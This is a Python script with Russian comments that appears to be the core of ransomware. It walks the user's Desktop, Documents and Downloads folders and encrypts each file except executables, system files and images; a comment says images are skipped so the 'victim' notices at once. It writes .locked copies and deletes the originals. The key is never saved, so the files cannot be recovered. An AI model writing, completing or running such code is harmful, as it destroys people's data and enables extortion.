from cryptography.fernet import Fernet
import base64
import hashlib

# Генерируем ключ шифрования
KEY = Fernet.generate_key()
cipher = Fernet(KEY)

def encrypt_files():
    # Папки для шифрования
    targets = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads")
    ]
    
    for target in targets:
        if not os.path.exists(target): continue
        for root, dirs, files in os.walk(target):
            for file in files:
                # Пропускаем системные файлы и картинки (чтобы жертва сразу увидела)
                if file.endswith(('.exe', '.dll', '.sys', '.jpg', '.png', '.locked')): continue
                
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, "rb") as f:
                        data = f.read()
                    
                    encrypted = cipher.encrypt(data)
                    with open(filepath + ".locked", "wb") as f:
                        f.write(encrypted)
                    os.remove(filepath) # Удаляем оригинал
                except: pass
